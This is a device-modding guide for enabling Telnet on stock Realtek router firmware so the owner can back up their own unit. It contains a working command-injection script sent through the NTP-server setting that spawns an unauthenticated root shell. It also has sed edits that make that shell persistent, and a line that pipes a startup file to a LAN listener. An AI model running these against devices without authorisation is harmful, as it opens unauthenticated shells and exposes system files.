# Enable Telnet on the stock Realtek firmware

The flash installer needs Telnet only to save a backup of **your own** stock Realtek
firmware. The temporary Telnet session below is enough to create that backup. If you already
have a verified backup of your unit, you may instead use `--skip-backup` as described in the
[flash installation guide](flash-install.md); that is strongly discouraged.

This method uses command injection through the stock NTP-server setting. It was published by
[backward on 4PDA](https://4pda.to/forum/index.php?showtopic=1037320&view=findpost&p=143376333)
and was reported working on Megafon firmware 01007. Stock firmware differs between regions and
carriers, so treat it as a device-local procedure and do not expose the resulting Telnet service
outside your trusted LAN.

> [!CAUTION]
> The commands below modify the stock Realtek system. A persistent Telnet daemon accepts a
> shell without a login prompt; enable it only if you need it, keep the router on a trusted LAN,
> and remove or restrict it when finished.

## 1. Start a temporary Telnet daemon

1. Open the stock web interface at `http://192.168.1.1` and sign in.
2. Open the browser developer console (for example, Firefox: F12, then **Console**).
3. Paste the following script and press Enter:

The primary method uses port 2323. Some stock variants filter the usual Telnet and SSH ports;
use another unused high port if 2323 conflicts with a service on your router. Pass the same
number to the installer as `--telnet-port NUMBER`; without that option it connects to 2323.

```js
(async () => {
    const injectedCommand = 'busybox telnetd -l /bin/sh -p 2323';
    const script = document.querySelector('script[src*="build.js"]');
    const buildUrl = script ? script.src : 'http://192.168.1.1/dist/build.js';
    const js = await (await fetch(buildUrl)).text();
    const key = js.match(/_TclRequestVerificationKey["']?\s*[:=]\s*["']([^"']+)["']/)[1];
    const cookie = document.cookie.match(/t=([^;]+)/);
    const token = decodeURIComponent(cookie[1]).replace(/^.{32}/, '');
    const response = await fetch('http://192.168.1.1/jrd/webapi', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json;charset=utf-8',
            '_TclRequestVerificationKey': key,
            '_TclRequestVerificationToken': token,
            'Accept': 'application/json, text/plain, */*',
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: JSON.stringify({
            id: '12',
            jsonrpc: '2.0',
            method: 'SetSystemSettings',
            params: {
                NtpServer1: `0.openwrt.pool.ntp.org; ${injectedCommand}`,
                NtpServer2: '1.openwrt.pool.ntp.org'
            }
        })
    });
    console.log(await response.json());
})();
```

The expected response is an object with `result: {}`. Connect from the computer on the
router's LAN:

```text
telnet 192.168.1.1 2323
```

This access is temporary and ends after a reboot. The injection replaces the NTP-server
values; restore them in the stock web interface after use.

## 2. Optional: make Telnet persistent

This part is firmware-specific. First check whether the startup script contains the login-based
Telnet command used by the Megafon 01007 procedure:

```sh
grep -nF 'telnetd -l /bin/login.sh' /jffs2/bin/oem_start.sh
```

Only if that command is printed, preserve the startup script, change it to an unauthenticated
shell on port 2323, enable the stock startup condition, and verify the edited line:

```sh
cp /jffs2/bin/oem_start.sh /jffs2/bin/oem_start.sh.bak
sed -i 's/telnetd -l \/bin\/login.sh/telnetd -l \/bin\/sh -p 2323 \&/' /jffs2/bin/oem_start.sh
touch /jrd-resource/resource/jrdcfg/enable_telnet
chmod 775 /jrd-resource/resource/jrdcfg/enable_telnet
grep -n 'telnetd' /jffs2/bin/oem_start.sh
restart
```

After the router restarts, connect again with `telnet 192.168.1.1 2323`. Keep
`oem_start.sh.bak` so the original startup behaviour can be restored later. If the first
`grep` printed nothing, do not run the `sed` command; use the marker-only variant below.

## 3. Fallback for firmware variants

If the injected `telnetd` command does not open port 2323, replace `injectedCommand` in the
script above with the following command, run the script, then reboot:

```text
touch /jffs2/resource/jrdcfg/enable_telnet
```

Some firmware already starts `telnetd -l /bin/sh` on the default port when this marker exists.
This was sufficient on one T-Mobile Poland unit. Try:

```text
telnet 192.168.1.1
```

For backup and installation through this port, add `--telnet-port 23` to the commands in the
[flash installation guide](flash-install.md).

If neither variant works, use the temporary injection only to inspect your own startup script.
On Windows, install Nmap to obtain `ncat`; on Linux and macOS use an equivalent `nc` listener.
Start a listener on the computer connected to the router:

```text
ncat -lvnp 4444 -k
```

Then replace the `injectedCommand` line in the browser script with the following, substituting
the computer's address on the router LAN for `PC_LAN_IP`:

```js
const injectedCommand = "sh -c 'cat /jffs2/bin/oem_start.sh | telnet PC_LAN_IP 4444'";
```

The listener receives the script text. Use it only to understand the startup logic of your own
firmware; do not send this traffic outside the local network.
